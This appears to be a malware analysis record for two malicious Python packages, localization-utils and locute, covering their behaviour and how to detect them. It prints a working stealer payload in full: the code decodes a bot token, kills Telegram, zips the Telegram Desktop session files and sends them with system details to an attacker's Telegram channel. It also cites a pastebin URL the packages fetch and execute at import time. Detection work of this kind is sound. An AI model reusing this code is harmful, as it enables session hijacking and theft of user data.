package_info.package_versions: all published versions (localization-utils: 4 versions, locute: 5 versions, all published on October 28)
package_info.why_malicious: Both packages contain highly obfuscated code that downloads and executes a remote payload designed to steal sensitive Telegram Desktop data and system information, exfiltrating it to an attacker-controlled Telegram channel. The obfuscation, dynamic code execution, and data exfiltration are clear indicators of malicious intent.

malicious_snippets.code_behavior: At import-time, the code dynamically reconstructs and imports standard library modules and functions, then downloads and executes a remote Python payload from https://pastebin.com/raw/WNrajaVK using urllib.request.urlopen, enabling remote code execution.

malice_analysis.why_suspicious: The code is heavily obfuscated, uses dynamic imports, and fetches and executes code from a remote source at import-time, which is a classic technique for evading static analysis and delivering second-stage payloads.
malice_analysis.violated_expectations: Normal Python packages do not download and execute remote code during import, nor do they obfuscate standard library usage to this degree.
malice_analysis.similar_legitimate_use: Dynamic imports and remote code fetching may be used in updaters or plugin systems, but never in a library context and never without user consent.
key_indicators: Heavy obfuscation (dynamic function/attribute resolution, bitwise operations)
Dynamic import and execution of remote code
Use of urllib.request.urlopen to fetch code from pastebin.com

malicious_snippets.code_snippet:
import json
import os
import platform
import socket
import subprocess
import time
import zipfile
from pathlib import Path

import requests

CHAT_ID = "-1002009496950"
TOKEN = "".join([chr(________________ ^ 257) for ________________ in [311, 312, 306, 308, 309, 305, 308, 311, 308, 305, 315, 320, 320, 324, 358, 330, 335, 376, 372, 343, 347, 375, 357, 373, 332, 344, 341, 352, 365, 366, 356, 305, 300, 331, 306, 379, 306, 365, 305, 360, 305, 361, 324, 375, 333, 324]])

def send_message(message_text):
    global TOKEN, CHAT_ID, requests
    base_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.get(base_url, data={"text": message_text, "chat_id": CHAT_ID})

def send_file(file_path):
    global TOKEN, CHAT_ID, requests
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    requests.post(
        url, data={"chat_id": CHAT_ID}, files={"document": open(file_path, "rb")}
    )

def get_system_report():
    global platform, socket, json, requests
    info = {}
    info["platform"] = platform.uname()
    info["platform-release"] = platform.release()
    info["platform-version"] = platform.version()
    info["architecture"] = platform.machine()
    info["hostname"] = socket.gethostname()
    info["ip-address"] = requests.get("http://api.ipify.org/").text
    info["processor"] = platform.processor()
    return json.dumps(info, indent=4)

system = platform.system()
if system == "Linux":
    tdata_dir = ".local/share/TelegramDesktop/tdata/"
else:
    tdata_dir = "AppData/Roaming/Telegram Desktop/tdata"
tdata_dir = Path.home() / Path(tdata_dir)

try:
    send_message(f"TARGET: '''{get_system_report()}'''")
    if tdata_dir.is_dir():
        subprocess.call(
            ["taskkill", "/f", "/im", "Telegram.exe"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(0.5)
        name = ""
        with open("debug.zip", "wb") as tmp:
            zf = zipfile.ZipFile(tmp, "w")
            for path in tdata_dir.rglob("*"):
                if path.is_file():
                    if os.stat(path).st_size < 10 * 1024:
                        zf.write(path.absolute(), path)
            zf.close()
            name = tmp.name
            send_message(f"TG FOUND!!\n{system}")
        send_file(name)
        os.remove(name)
    else:
        message_text = send_message(f"ERROR TG NOT FOUND!!\n{system} {tdata_dir}")
except Exception as e:
    pass
malicious_snippets.code_behavior: At import-time (as executed by snippet_1), the code collects system information and searches for Telegram Desktop data, compresses it, and exfiltrates both system info and Telegram data to an attacker-controlled Telegram channel via the Telegram Bot API.

malice_analysis.why_suspicious: The code collects sensitive user data (system info, Telegram Desktop files), compresses it, and exfiltrates it to a remote attacker via Telegram. It also attempts to kill the Telegram process to ensure data is not locked.
malice_analysis.violated_expectations: Legitimate packages do not access or exfiltrate user data, nor do they interact with Telegram Desktop files or send data to external chat channels.
malice_analysis.similar_legitimate_use: System inventory scripts or backup tools may collect system info or compress user data, but never exfiltrate it to an unknown Telegram channel.

detection_knowledge.how_to_detect: Monitor for Python packages containing obfuscated code that performs dynamic imports, bitwise operations, and remote code execution at import-time. Flag any code that downloads and executes remote payloads, especially from pastebin.com or similar services. Detect access to Telegram Desktop tdata directories and outgoing connections to the Telegram Bot API. Look for the presence of inset.py and memory_normalizer/headers.py with suspicious integer arrays. Alert on any package that compresses and exfiltrates user data to external chat services.
